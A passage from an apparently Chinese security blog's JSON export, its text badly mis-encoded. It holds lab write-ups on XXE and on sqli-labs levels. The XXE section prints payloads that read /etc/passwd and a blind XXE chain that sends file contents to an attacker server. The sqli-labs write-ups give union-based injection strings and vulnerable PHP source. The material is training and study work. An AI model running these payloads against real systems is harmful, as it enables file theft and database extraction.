é™¤å†…éƒ¨ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¹¶ä¸”å…³é—­å†…éƒ¨ç¼“å†²åŒºä½¿ç”¨æ–¹æ³•ï¼švoid ob_end_clean(void)è¯´æ˜ï¼šè¿™ä¸ªå‡½æ•°ä¸ä¼šè¾“å‡ºå†…éƒ¨ç¼“å†²åŒºçš„å†…å®¹è€Œæ˜¯æŠŠå®ƒåˆ é™¤ï¼ +++ var_dump() å‡½æ•°ç”¨äºè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚ var_dump() å‡½æ•°æ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ã€‚æ•°ç»„å°†é€’å½’å±•å¼€å€¼ï¼Œé€šè¿‡ç¼©è¿›æ˜¾ç¤ºå…¶ç»“æ„ã€‚+++ htmlspecialchars() å‡½æ•°æŠŠç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚è¿™æ„å‘³ç€ &lt; ã€&gt; ä¹‹ç±»çš„ HTML å­—ç¬¦ä¼šè¢«æ›¿æ¢ä¸º &amp;lt; å’Œ &amp;gt;ã€‚è¿™æ ·å¯é˜²æ­¢æ”»å‡»è€…é€šè¿‡åœ¨è¡¨å•ä¸­æ³¨å…¥ HTML æˆ– JavaScript ä»£ç ï¼ˆè·¨ç«™ç‚¹è„šæœ¬æ”»å‡»ï¼‰å¯¹ä»£ç è¿›è¡Œåˆ©ç”¨ã€‚ +++ æ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯ï¼Œç”±äºè¯¥ä»£ç æœªç¦ç”¨åŠ è½½å¤–éƒ¨å®ä½“ï¼Œå½“æˆ‘ä»¬ä¼ å…¥æ¶æ„XMLæ–‡ä»¶åï¼ŒæœåŠ¡å™¨ç›´æ¥å¯¹postæ•°æ®è¿›è¡Œxmlè§£æï¼Œå¹¶åŠ è½½å¤–éƒ¨å®ä½“ï¼Œä½¿ä¹‹è¯»å…¥æˆ‘ä»¬æƒ³è¦å¾—åˆ°å†…å®¹åˆ°ç¼“å†²åŒºï¼Œè¾“å‡ºå˜é‡ç›¸å…³æ€§æ¯åï¼Œå°†ç¼“å†²åŒºå†…å®¹èµ‹å€¼ç»™å…¶ä»–å˜é‡ï¼Œæœ€ç»ˆå›æ˜¾å˜é‡å†…å®¹ã€‚ æ„é€ payload1234567&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY content SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;note&gt; &lt;name&gt;&amp;content;&lt;/name&gt;&lt;/note&gt; å¾—åˆ°ç›®æ ‡å†…å®¹ï¼š 2.SimpleXMLElement.phpæ‰“å¼€é“¾æ¥ï¼Œé¡µé¢æ ·å¼ä¸DOMDocument.phpæ— äºŒï¼Œç›´æ¥æ¥æŸ¥çœ‹æºç ï¼› 1234567891011121314151617181920&lt;?phpif(isset($_GET['s']))&#123; show_source(__FILE__); exit;&#125;libxml_disable_entity_loader(false);$data = isset($_POST['data'])?trim($_POST['data']):'';$resp = '';if($data != false)&#123; $xml = new SimpleXMLElement($data, LIBXML_NOENT); ob_start(); var_dump($xml); $resp = ob_get_contents(); ob_end_clean(); &#125;?&gt; &lt;?php echo htmlspecialchars($resp);?&gt; æºç åªä¸DOMDocument.phpä¸­æ–°å»ºå¯¹è±¡ä¸åŒï¼› ï¼ˆSimpleXML å‡½æ•°æ˜¯ PHP æ ¸å¿ƒçš„ç»„æˆéƒ¨åˆ†ã€‚æ— éœ€å®‰è£…å³å¯ä½¿ç”¨è¿™äº›å‡½æ•°ã€‚ DOMDocument åŒæ ·ä¹Ÿæ˜¯ï¼ŒDOM XML è§£æå™¨å‡½æ•°æ˜¯ PHP æ ¸å¿ƒçš„ç»„æˆéƒ¨åˆ†ã€‚æ— éœ€å®‰è£…å°±å¯ä»¥ä½¿ç”¨è¿™äº›å‡½æ•°ã€‚ SimpleXMLæ“ä½œxmlç›¸å¯¹DOMDocumentè¦ç®€å•è®¸å¤šï¼Œä½†å‡½æ•°åŠŸèƒ½è¾ƒå°‘ï¼Œé€‚åˆå®ç°è¾ƒç®€å•çš„åŠŸèƒ½ï¼Œè¯¦æƒ…å¯å‚è§SimpleXMLçš„å‡½æ•°æ–‡æ¡£ï¼ŒDOMDocumentåˆ™æä¾›äº†å…¨é¢çš„æ“ä½œxmlå‡½æ•°å’Œå±æ€§ï¼Œé€‚åˆå®ç°å¤æ‚çš„xmlæ“ä½œã€‚ï¼‰ æ„é€ payload1234567&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY content SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;note&gt; &lt;name&gt;&amp;content;&lt;/name&gt;&lt;/note&gt; è¿”å›ç›®æ ‡ç»“æœï¼š +++ 3.simplexml_load_string.php1234567891011121314151617181920&lt;?phpif(isset($_GET['s']))&#123; show_source(__FILE__); exit;&#125;libxml_disable_entity_loader(false);$data = isset($_POST['data'])?trim($_POST['data']):'';$resp = '';if($data != false)&#123; $xml = simplexml_load_string($data, 'SimpleXMLElement', LIBXML_NOENT); ob_start(); var_dump($xml); $resp = ob_get_contents(); ob_end_clean(); &#125;?&gt; &lt;?php echo htmlspecialchars($resp);?&gt; simplexml_load_string;#ä» XML å­—ç¬¦ä¸²è·å– SimpleXMLElement å¯¹è±¡ï¼ˆè½¬æ¢å½¢å¼è‰¯å¥½çš„ XML å­—ç¬¦ä¸²ä¸º SimpleXMLElement å¯¹è±¡ï¼Œç„¶åè¾“å‡ºå¯¹è±¡çš„é”®å’Œå…ƒç´ ï¼‰ è¯­æ³•simplexml_load_string(*data,classname,options,ns,is_prefix*); å‚æ•° æè¿° data å¿…éœ€ã€‚è§„å®šå½¢å¼è‰¯å¥½çš„ XML å­—ç¬¦ä¸²ã€‚ classname å¯é€‰ã€‚è§„å®šæ–°å¯¹è±¡çš„ classã€‚ options å¯é€‰ã€‚è§„å®šé™„åŠ çš„ Libxml å‚æ•°ã€‚é€šè¿‡æŒ‡å®šé€‰é¡¹ä¸º 1 æˆ– 0ï¼ˆTRUE æˆ– FALSEï¼Œä¾‹å¦‚ LIBXML_NOBLANKS(1)ï¼‰è¿›è¡Œè®¾ç½®ã€‚ +++ æºç ä¸ä¹‹å‰å…³å¡æ²¡æœ‰å¤ªå¤§ä¸åŒï¼Œä»…æ”¹å˜è·å–å®ä½“çš„æ–¹æ³•ã€‚libxml_disable_entity_loader(false);å¤„ï¼Œæœªç¦æ­¢åŠ è½½å¤–éƒ¨å®ä½“ï¼›åŒæ—¶simplexml_load_stringå…è®¸æˆ‘ä»¬é€šè¿‡DTDæ¥å®šä¹‰å¤–éƒ¨å®ä½“ã€‚ æ„é€ payload12345&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY test SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;abc&gt;&amp;test;&lt;/abc&gt; å¾—åˆ°ç›®æ ‡å†…å®¹ï¼š 4.BlindXXE.phpæŸ¥çœ‹æºç ï¼š 12345678910111213141516171819&lt;?phpif(isset($_GET['s']))&#123; show_source(__FILE__); exit;&#125;libxml_disable_entity_loader(false);$data = isset($_POST['data'])?trim($_POST['data']):'';$resp = '';if($data != false)&#123; $xml = simplexml_load_string($data, 'SimpleXMLElement', LIBXML_NOENT); if($xml &amp;&amp; isset($xml-&gt;name))&#123; $name = $xml-&gt;name; &#125; &#125;?&gt; &lt;?php echo isset($name)?'ok':'error';?&gt; ç»è¿‡æµ‹è¯•å‘ç°ä»…è¿”å›okæˆ–errorï¼› æºç ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼šecho isset($name)?&#39;ok&#39;:&#39;error&#39;; blind xxeæ€æƒ³å°±æ˜¯å°†æ•°æ®é€šè¿‡å¤–éƒ¨æœåŠ¡å™¨æˆ–è€…æŠ¥é”™ä¿¡æ¯å¸¦å‡ºæ¥; æ„é€ å¦‚ä¸‹payloadï¼š 1234567&lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE test[ &lt;!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"&gt; &lt;!ENTITY % dtd SYSTEM \"http://192.168.40.128/evil.xml\"&gt; %dtd; %send; ]&gt;&lt;abc&gt;&lt;/abc&gt; è§£ææµç¨‹ï¼šXMLè§£æå™¨ï¼š é¦–å…ˆæ£€æŸ¥XMLç‰ˆæœ¬ï¼ˆä¾æ®ç‰ˆæœ¬è¿›è¡Œè§£æå¤„ç†ï¼‰ æ£€æŸ¥æ–‡æ¡£ç±»å‹å®šä¹‰çš„DTDï¼ˆå†…è”DTDï¼‰ è§£æå™¨è¯»å–php://filter/convert.base64-encode/resource=/etc/passwdå†…å®¹ å°†è¯»å–çš„å†…å®¹å­˜å‚¨åˆ°fileå®ä½“ä¸­ï¼ˆç”¨èµ‹å€¼æ¥ä»£æ›¿å‚æ•°å®ä½“ï¼‰ dtdä¸ºå‚æ•°å®ä½“ï¼Œå®ƒçš„å€¼ä¸ºhttp://192.168.40.128/evil.xml å¼•ç”¨å‚æ•°å®ä½“dtd å¼•ç”¨å®ä½“sendï¼Œè€Œsendå­˜åœ¨äºevil.xmlä¸­ +++ ç”±äºåœ¨å†…éƒ¨DTDé‡Œï¼Œå‚æ•°å®ä½“å¼•ç”¨åªèƒ½å’Œå…ƒç´ åŒçº§è€Œä¸èƒ½ç›´æ¥å‡ºç°åœ¨å…ƒç´ å£°æ˜å†…éƒ¨ï¼Œå¦åˆ™è§£æå™¨ä¼šæŠ¥é”™ï¼š PEReferences forbidden in internal subsetã€‚ æ‰€ä»¥ï¼Œå‚æ•°å®ä½“å¼•ç”¨%file;å¿…é¡»æ”¾åœ¨å¤–éƒ¨æ–‡ä»¶é‡Œ ã€‚ æ‰€ä»¥æˆ‘ä»¬åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šåˆ›å»ºevil.xml,å¹¶å†™å…¥å¦‚ä¸‹å†…å®¹ï¼š 12&lt;!ENTITY % payload \"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.40.128/?content=%file;'&gt;\"&gt; %payload; æ³¨æ„ï¼Œå› ä¸ºè¿™é‡Œæ˜¯å‚æ•°å®ä½“payloadæ¥åµŒå¥—å®šä¹‰å‚æ•°å®ä½“sendï¼Œæ‰€ä»¥è¢«åµŒå¥—å®šä¹‰çš„å‚æ•°å®ä½“%ä¸€å®šè¦HTMLç¼–ç ä¸ºï¼š&amp;#x25; æ­¤æ—¶ï¼Œè°ƒç”¨çš„è¿‡ç¨‹å°±å˜ä¸ºï¼šå‚æ•°å®ä½“dtdé€šè¿‡httpåè®®æ¥è®¿é—®æœåŠ¡å™¨ä¸Šçš„evil.xmlï¼Œç„¶åè¿”å›evil.xmlçš„å†…å®¹ï¼Œè°ƒç”¨äº†å‚æ•°å®ä½“payloadï¼Œç„¶åpayloadåˆè°ƒç”¨äº†å‚æ•°å®ä½“sendï¼Œsendçš„ä½œç”¨å°±æ˜¯æŠŠå‚æ•°å®ä½“fileï¼ˆå³æ–‡ä»¶/etc/passwdçš„base64ç¼–ç å†…å®¹ï¼‰å‘é€åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Š,è§£å¯†base64ç¼–ç å†…å®¹å³å¯ï¼› ä½†æ˜¯ï¼Œå¦‚æœç›®æ ‡é¶æœºä¸å…è®¸æˆ‘ä»¬è®¿é—®å¤–ç½‘ï¼Œé‚£ä¹ˆå°±éœ€è¦ç”¨åˆ°å¦ä¸€ç§æ–¹æ³•ï¼šåˆ©ç”¨æœ¬åœ°dtdæ–‡ä»¶é‡æ–°å®šä¹‰å‚æ•°å®ä½“äº§ç”ŸæŠ¥é”™ä»è€Œå›æ˜¾ä¿¡æ¯ã€‚ +++ å‚è€ƒï¼š[1].https://nikoeurus.github.io/2019/11/06/XXE%E6%80%BB%E7%BB%93/#LookAround [2]. https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/ [3].https://www.freebuf.com/vuls/207639.html [4].https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2","categories":[],"tags":[{"name":"XXE","slug":"XXE","permalink":"https://singlemindedt.github.io/tags/XXE/"}]},{"title":"æ“ä½œç³»ç»Ÿå®‰å…¨","slug":"æ“ä½œç³»ç»Ÿå®‰å…¨","date":"2020-02-28T02:26:23.000Z","updated":"2020-02-28T05:06:58.773Z","comments":true,"path":"2020/02/28/æ“ä½œç³»ç»Ÿå®‰å…¨/","link":"","permalink":"https://singlemindedt.github.io/2020/02/28/æ“ä½œç³»ç»Ÿå®‰å…¨/","excerpt":"","text":"","categories":[],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"Linuxæ“ä½œç³»ç»Ÿ","slug":"Linuxæ“ä½œç³»ç»Ÿ","date":"2020-02-28T01:29:23.000Z","updated":"2020-03-06T01:49:44.534Z","comments":true,"path":"2020/02/28/Linuxæ“ä½œç³»ç»Ÿ/","link":"","permalink":"https://singlemindedt.github.io/2020/02/28/Linuxæ“ä½œç³»ç»Ÿ/","excerpt":"","text":"ç¬¬å››è®²ç”¨æˆ·ç»„æ–‡ä»¶æ™®é€šç”¨æˆ·ç®¡ç†1.æ·»åŠ ç”¨æˆ·å‘½ä»¤:useradd2.æ›´æ”¹ç”¨æˆ·å£ä»¤å‘½ä»¤ï¼špasswd åœ¨åˆ›å»ºLinuxåˆ†åŒºæ—¶,ä¸€å®šè¦åˆ›å»ºä¸¤ä¸ªåˆ†åŒº:SWAP/ROOT 3.who -uæŸ¥å·²ç™»å½•åˆ°ç³»ç»Ÿçš„ç”¨æˆ·è¿›ç¨‹4.kill -9 è¿›ç¨‹å· su/sudo(å—é™çš„su,æ›´å®‰å…¨ï¼›æˆæƒè®¸å¯çš„su,é…ç½®æ–‡ä»¶/etc/sudoers) shellç¼–ç¨‹ Pythonè¡¨è¾¾å¼ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ï¼ˆ ï¼‰æ§åˆ¶è¿ç®—ç¬¦çš„ä¼˜å…ˆé¡ºåºã€‚ userdel myname æ³¨ï¼šåˆ é™¤ç”¨æˆ·mynameï¼Œä½†ä¸åˆ é™¤å…¶homeç›®å½•åŠæ–‡ä»¶ï¼› userdel -r myname æ³¨ï¼šåˆ é™¤ç”¨æˆ·mynamtï¼Œå…¶homeç›®å½•åŠå…¶ä»–æ–‡ä»¶ä¸€å¹¶åˆ é™¤ï¼›","categories":[],"tags":[]},{"title":"sqli-labs-Page-1-Less-4","slug":"sqli-labs-Page-1-Less-4","date":"2020-02-26T10:41:44.000Z","updated":"2020-02-27T01:14:49.915Z","comments":true,"path":"2020/02/26/sqli-labs-Page-1-Less-4/","link":"","permalink":"https://singlemindedt.github.io/2020/02/26/sqli-labs-Page-1-Less-4/","excerpt":"","text":"Less-4ï¼ˆGETæ–¹å¼-åŸºäºåŒå¼•å·-stringå‹ï¼‰æ ¹æ®é¡µé¢æç¤ºï¼š 1Please input the ID as parameter with numeric value å°è¯•é€šè¿‡getæ–¹å¼è¾“å…¥IDå’Œæ•°å€¼å‚æ•°ï¼š?id=1 æˆåŠŸå¾—åˆ°æŸ¥è¯¢ç»“æœï¼› æ·»åŠ å•å¼•å·ï¼š?id=1â€™ è¯­å¥æ­£å¸¸æ‰§è¡Œï¼› æ·»åŠ åŒå¼•å·ï¼š?id=1â€œ å‡ºç°äº†æŠ¥é”™ä¿¡æ¯ï¼Œä»”ç»†è§‚å¯Ÿä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°æŠ¥é”™ä¿¡æ¯é‡Œå‡ºç°äº†å¤šä¸ªåŒå¼•å·å’Œä¸€ä¸ªåœ†æ‹¬å·ï¼ŒçŒœæµ‹å¯èƒ½ä¸º(â€œâ€)é—­åˆæ–¹å¼ï¼› æ·»åŠ åŒå¼•å·+ï¼‰ï¼š?id=1â€œï¼‰ çœ‹åˆ°å‡ºç°äº†æŠ¥é”™ç»“æœï¼Œé”™è¯¯å°±åœ¨â€ï¼‰é™„è¿‘ï¼› æ·»åŠ åŒå¼•å·+ï¼‰â€“+ï¼š?id=1â€œï¼‰â€“+ æˆåŠŸæŸ¥è¯¢åˆ°ç»“æœï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šä¸º(â€œâ€)é—­åˆæ–¹å¼ï¼› å°è¯•è¾“å…¥?id=1â€œï¼‰and 1=2â€“+ å¯ä»¥çœ‹åˆ°æ—¢æ— æŠ¥é”™ä¿¡æ¯ä¹Ÿæ²¡æœ‰å›æ˜¾ä»»ä½•å†…å®¹ï¼Œè¯´æ˜æˆ‘ä»¬æ‰€è¾“å…¥çš„è¯­æ³•æ˜¯å¯¹çš„ï¼Œåœ¨1=2ä¸Šå­˜åœ¨é€»è¾‘é”™è¯¯ï¼Œå³SELECT * FROM users WHERE id=(â€œ1â€)and 1=2--+â€) LIMIT 0,1ï¼› å°è¯•è¾“å…¥?id=1â€ï¼‰and 1=1â€“+ æˆåŠŸå¾—åˆ°æŸ¥è¯¢å†…å®¹ä¸?id=1â€œï¼‰â€“+ç»“æœä¸€è‡´ï¼Œå³è¯­æ³•å’Œé€»è¾‘å‡æ­£ç¡®ï¼Œè¯´æ˜æ­¤å¤„ç¡®ä¸º(â€œâ€)å­—ç¬¦å‹æ³¨å…¥ï¼› ==çŒœè§£æ•°æ®åº“å†…å®¹==çŒœè§£è¿‡ç¨‹ä¸Page-1-Less-3åŸºæœ¬ç›¸åŒï¼Œåªæ˜¯åœ¨åŸæ¥çš„åŸºç¡€ä¸Šå°†â€˜æ”¹ä¸ºâ€ï¼Œæ­¤å¤„ä»…ä¸¾ä¸€ä¾‹ï¼›ä¾‹ï¼šåˆ©ç”¨æ˜¾ç¤ºä½çˆ†ç ´æ•°æ®åº“åï¼š?id=-1â€) union select 1,(select group_concat(schema_name) from information_schema.schemata),3 â€“+ æˆåŠŸå¾—åˆ°æŸ¥è¯¢ç»“æœï¼› æŸ¥çœ‹æºç ï¼šå¯ä»¥çœ‹åˆ°æŸ¥è¯¢è¯­å¥çš„æ ¼å¼ä¸ºï¼š$id = &#39;&quot;&#39; . $id . &#39;&quot;&#39;;//å°†IDå˜é‡ä¸â€œè¿æ¥ï¼›æ„æˆæ–°çš„IDï¼›$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;; 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php//including the Mysql connect parameters.include(\"../sql-connections/sql-connect.php\");error_reporting(0);// take the variablesif(isset($_GET['id']))&#123;$id=$_GET['id'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'ID:'.$id.\"\\n\");fclose($fp);// connectivity $id = '\"' . $id . '\"';$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo \"&lt;font size='5' color= '#99FF00'&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;?&gt;","categories":[],"tags":[]},{"title":"sqli-labs-Page-1-Less-3","slug":"sqli-labs-Page-1-Less-3","date":"2020-02-25T02:25:38.000Z","updated":"2020-02-27T01:15:51.677Z","comments":true,"path":"2020/02/25/sqli-labs-Page-1-Less-3/","link":"","permalink":"https://singlemindedt.github.io/2020/02/25/sqli-labs-Page-1-Less-3/","excerpt":"","text":"Less-3 ï¼ˆGETæ–¹å¼-åŸºäºå•å¼•å·å˜å½¢-stringå‹ï¼‰æ ¹æ®é¡µé¢æç¤ºï¼š 1Please input the ID as parameter with numeric value å°è¯•é€šè¿‡getæ–¹å¼è¾“å…¥IDå’Œæ•°å€¼å‚æ•°ï¼š?id=1 æˆåŠŸå¾—åˆ°æŸ¥è¯¢ç»“æœï¼› æ·»åŠ å•å¼•å·ï¼š?id=1â€™ å¾—åˆ°æŠ¥é”™ä¿¡æ¯ï¼Œå³æˆ‘ä»¬æ‰€è¾“å…¥çš„å•å¼•å·ä¸æŸ¥è¯¢è¯­å¥æ ¼å¼ä¸åŒ¹é…ï¼Œä»æŠ¥é”™ä¿¡æ¯è¿˜å¯ä»¥çœ‹å‡ºå¯èƒ½ä¸â€™ï¼‰â€˜æœ‰å…³ï¼ŒçŒœæµ‹å¯èƒ½ä¸ºå•å¼•å·å¤šä½™æˆ–è€…é—­åˆæ ¼å¼ä¸ºï¼ˆâ€™â€˜ï¼‰é€ æˆï¼› åŠ å…¥æ³¨é‡Šç¬¦ï¼š?id=1â€™â€“+ å¯ä»¥çœ‹å‡ºè¿˜æ˜¯å›æ˜¾æŠ¥é”™ä¿¡æ¯ï¼Œå¹¶ä¸”é”™è¯¯ä¹‹å¤„è¿˜æ˜¯åœ¨å•å¼•å·é™„è¿‘ï¼› åŠ å•å¼•å·+ï¼‰+æ³¨é‡Šç¬¦ ?id=1â€™ï¼‰â€“+ çœ‹åˆ°æˆåŠŸå¾—åˆ°æŸ¥è¯¢å†…å®¹ï¼Œæ‰€ä»¥è¯¥å¤„çš„é—­åˆæ–¹å¼ä¸º(â€˜â€™); å°è¯•è¾“å…¥?id=1â€™ï¼‰and 1=2â€“+ å¯ä»¥çœ‹åˆ°æ—¢æ— æŠ¥é”™ä¿¡æ¯ä¹Ÿæ²¡æœ‰å›æ˜¾ä»»ä½•å†…å®¹ï¼Œè¯´æ˜æˆ‘ä»¬æ‰€è¾“å…¥çš„è¯­æ³•æ˜¯å¯¹çš„ï¼Œåœ¨1=2ä¸Šå­˜åœ¨é€»è¾‘é”™è¯¯ï¼Œå³SELECT * FROM users WHERE id=(&#39;1&#39;)and 1=2--+&#39;) LIMIT 0,1ï¼› å°è¯•è¾“å…¥?id=1â€™ï¼‰and 1=1â€“+ æˆåŠŸå¾—åˆ°æŸ¥è¯¢å†…å®¹ï¼Œè¯´æ˜æ­¤å¤„ç¡®ä¸º(â€˜â€™)å­—ç¬¦å‹æ³¨å…¥ï¼› ==çŒœè§£æ•°æ®åº“å†…å®¹==çŒœè§£è¿‡ç¨‹ä¸Page-1-Less-1åŸºæœ¬ç›¸åŒï¼Œåªæ˜¯åœ¨åŸæ¥çš„åŸºç¡€ä¸ŠåŠ ä¸€ä¸ªâ€œ)â€ï¼Œæ­¤å¤„ä»…ä¸¾ä¸€ä¾‹ï¼›ä¾‹ï¼šæ•°æ®åº“ç‰ˆæœ¬ï¼Œåº“åï¼š?id=-1â€™) union select 1,version(),database() â€“+ æˆåŠŸå¾—åˆ°ç»“æœï¼› æŸ¥çœ‹æºç ï¼šå¯ä»¥çœ‹åˆ°æŸ¥è¯¢è¯­å¥çš„æ ¼å¼ä¸ºï¼šSELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php//including the Mysql connect parameters.include(\"../sql-connections/sql-connect.php\");error_reporting(0);// take the variablesif(isset($_GET['id']))&#123;$id=$_GET['id'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'ID:'.$id.\"\\n\");fclose($fp);// connectivity $sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo \"&lt;font size='5' color= '#99FF00'&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;?&gt;","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"sqli-labs-Page-1-Less-2","slug":"sqli-labs-Page-1-Less-2","date":"2020-02-20T08:45:57.000Z","updated":"2020-02-27T15:02:18.817Z","comments":true,"path":"2020/02/20/sqli-labs-Page-1-Less-2/","link":"","permalink":"https://singlemindedt.github.io/2020/02/20/sqli-labs-Page-1-Less-2/","excerpt":"","text":"Less-2ï¼ˆGETæ–¹å¼-åŸºäºæ•´å‹ï¼‰ æ ¹æ®é¡µé¢æç¤ºï¼š 1Please input the ID as parameter with numeric value å°è¯•é€šè¿‡getæ–¹å¼è¾“å…¥IDå’Œæ•°å€¼å‚æ•°ï¼š?id=1 å¯ä»¥çœ‹åˆ°ç»™å‡ºäº†ç›¸åº”çš„login name å’Œpassword; å†æ·»åŠ ä¸€ä¸ªå•å¼•å·çœ‹çœ‹ï¼š?id=1â€™ 12é”™è¯¯ä¿¡æ¯ï¼š You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1 è¿™æ—¶sqlè¯­å¥å‡ºé”™ï¼Œç¨‹åºæ— æ³•æ­£å¸¸ä»æ•°æ®åº“ä¸­æŸ¥è¯¢å‡ºæ•°æ®ï¼ŒæŠ›å‡ºå¼‚å¸¸ï¼› æ·»åŠ and 1=1ï¼›?id=1 and 1=1 å¯çœ‹åˆ°å‘½ä»¤æ‰§è¡Œæ­£å¸¸ï¼Œè¿”å›äº†æŸ¥è¯¢ç»“æœï¼› åŠ å•å¼•å·+and 1=1?id=1â€™ and 1=1 å¯ä»¥çœ‹åˆ°è¯­å¥æŠ¥é”™ï¼ŒæŠ›å‡ºå¼‚å¸¸ï¼› æ·»åŠ and 1=2?id=1 and 1=2 å¯ä»¥çœ‹åˆ°è¯­å¥æ­£å¸¸æ‰§è¡Œï¼Œä½†æ˜¯æ— è¿”å›ç»“æœï¼Œå³ä»æ­¤å¤„å°±å¯ä»¥çœ‹å‡ºï¼Œè¯­å¥æ­£ç¡®ï¼Œä½†æ˜¯é€»è¾‘é”™è¯¯ï¼Œæ‰€ä»¥è¿”å›é”™è¯¯ï¼Œæ‰€ä»¥æ­¤å¤„ä¸ºæ•´å‹æ³¨å…¥ã€‚ ==æ¥ä¸‹æ¥æŒ‰æµç¨‹çŒœè§£æ•°æ®åº“å†…å®¹ï¼š==*ç”±äºè¯¥æ•°æ®åº“å¹¶æ²¡æœ‰å…¶ä»–é™åˆ¶è¯­å¥ï¼Œæ•…æ­¤ä¾‹çœç•¥æ³¨é‡Šç¬¦â€“ *1.çŒœè§£æ•°æ®åº“è¡¨åˆ—æ•°?id=1 order by 3 order by 3é¡µé¢å›æ˜¾æ­£å¸¸;[25]:()order by 4é¡µé¢å›æ˜¾æŠ¥é”™,æ•…è¯¥è¡¨å…±æœ‰3åˆ—ï¼› 2.åˆ¤æ–­æ•°æ®æ˜¾ç¤ºä½?id=-1 union select 1,2,3[26]:()å¾—åˆ°æœ‰2ï¼Œ3ä¸¤ä¸ªæ˜¾ç¤ºä½ï¼› 3.åˆ©ç”¨æ˜¾ç¤ºä½çˆ†ç ´æ•°æ®åº“ç‰ˆæœ¬åŠæ•°æ®åº“å?id=-1 union select 1,version(),database()[27]:()çˆ†å‡ºï¼Œversionï¼š5.5.53ï¼Œdatabaseï¼šsecurityï¼› æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“åï¼š ?id=-1 union select 1,(select group_concat(schema_name)from information_schema.schemata),3â€“+[28]:()å¾—åˆ°8ä¸ªæ•°æ®åº“ï¼Œåˆ†åˆ«ä¸ºï¼šinformation_schema,challenges,dvwa,easysql,mysql,performance_schema,security,test; 4.åˆ©ç”¨æ˜¾ç¤ºä½çˆ†ç ´è¡¨åï¼Œæ­¤å¤„æˆ‘ä»¬æŸ¥mysqlæ•°æ®åº“ä¸­çš„è¡¨å?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=â€™mysqlâ€™),3â€“+[29]:()å¾—åˆ°å¾ˆå¤šè¡¨ï¼Œæ­¤å¤„ä¸ä¸€ä¸€åˆ—ä¸¾ï¼› 5.åˆ©ç”¨æ˜¾ç¤ºä½çˆ†ç ´åˆ—åï¼Œæ­¤å¤„æˆ‘ä»¬æŸ¥è¯¢dbè¡¨é‡Œçš„åˆ—?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=â€™dbâ€™),3â€“+[30]:()å¾—åˆ°å¾ˆå¤šåˆ—ï¼Œæ­¤å¤„ä¸ä¸€ä¸€åˆ—ä¸¾ï¼› 6.åˆ©ç”¨æ˜¾ç¤ºä½çˆ†ç ´å­—æ®µï¼Œæ­¤å¤„æˆ‘ä»¬æŸ¥è¯¢dbè¡¨ä¸­Hostå’ŒUser ?id=-1 union select 1,(select group_concat(Host) from mysql.db),(select group_concat(User) from mysql.db)â€“+ å¾—åˆ°Hostå†…å®¹%ï¼Œ%ï¼›Userï¼šï¼Œï¼›æŸ¥çœ‹æºç ï¼šæŸ¥è¯¢è¯­å¥ä¸ºï¼šSELECT * FROM users WHERE id=$id LIMIT 0,1ï¼Œç¡®ä¸ºæ•´å‹æ³¨å…¥ï¼› 12345678910111213141516171819202122232425262728293031323334353637&lt;?php//including the Mysql connect parameters.include(\"../sql-connections/sql-connect.php\");error_reporting(0);// take the variablesif(isset($_GET['id']))&#123;$id=$_GET['id'];//logging the connection parameters to a file for 